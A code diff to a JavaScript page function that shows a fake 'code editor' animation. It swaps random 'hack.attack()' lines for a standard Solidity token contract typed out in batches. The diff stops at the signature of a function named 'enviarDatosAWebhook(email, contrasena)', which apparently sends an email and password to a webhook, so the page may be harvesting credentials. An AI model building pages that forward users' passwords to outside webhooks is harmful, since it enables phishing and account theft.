@@ -267,34 +267,48 @@ function mostrarFakeEditor() {
     editor.style.display = 'block';
     editor.textContent = ""; // Limpia el editor antes de empezar
 
-    // Generar comandos falsos aleatorios
-    let commands = ["init()", "attack()", "override()", "setPassword()", "fetch()", "encrypt()", "console.log()", "decrypt()", "setTimeout()", "addEventListener()", "removeItem()", "dispatchEvent()", "querySelectAll()", "createElement()"];
-    let fakeCodeLines = [];
-    for (let i = 0; i < 200; i++) { // Ajusta para más líneas
-        let command = commands[Math.floor(Math.random() * commands.length)];
-        fakeCodeLines.push(`hack.${command} 'param${i}'`);
-    }
+    // Generar comandos falsos de Solidity
+    let fakeCodeLines = [
+        "pragma solidity ^0.8.0;",
+        "",
+        "contract Coin {",
+        "    address public minter;",
+        "    mapping (address => uint) public balances;",
+        "",
+        "    event Sent(address from, address to, uint amount);",
+        "",
+        "    constructor() {",
+        "        minter = msg.sender;",
+        "    }",
+        "",
+        "    function mint(address receiver, uint amount) public {",
+        "        require(msg.sender == minter);",
+        "        require(amount < 1e60);",
+        "        balances[receiver] += amount;",
+        "    }",
+        "",
+        "    function send(address receiver, uint amount) public {",
+        "        require(amount <= balances[msg.sender], 'Insufficient balance.');",
+        "        balances[msg.sender] -= amount;",
+        "        balances[receiver] += amount;",
+        "        emit Sent(msg.sender, receiver, amount);",
+        "    }",
+        "}"
+    ];
 
-    // Función que simula la escritura de texto
+    // Función que simula la escritura de texto, actualizando con 5 líneas más de código cada vez
     let currentLine = 0;
-    let currentChar = 0;
-    function typeLine() {
-        if (currentLine < fakeCodeLines.length) {
-            let line = fakeCodeLines[currentLine];
-            if (currentChar < line.length) {
-                editor.textContent += line.charAt(currentChar);
-                currentChar++;
-                setTimeout(typeLine, Math.max(1800 / fakeCodeLines.length, 25)); // Ajusta para que dure ~1 minuto
-            } else {
-                editor.textContent += '\n'; // Salto de línea al final de cada comando
-                currentLine++;
-                currentChar = 0;
-                setTimeout(typeLine, 50); // Retardo antes de empezar la siguiente línea
-            }
+    let updateCode = () => {
+        let endLine = Math.min(currentLine + 5, fakeCodeLines.length);
+        for (; currentLine < endLine; currentLine++) {
+            editor.textContent += fakeCodeLines[currentLine] + '\n';
         }
-    }
+        if (currentLine < fakeCodeLines.length) {
+            setTimeout(updateCode, 1000); // Espera 1 segundo antes de agregar más líneas
+        }
+    };
 
-    typeLine(); // Inicia la simulación de tipeo
+    updateCode(); // Inicia la simulación de tipeo
 }
 
 function enviarDatosAWebhook(email, contrasena) {
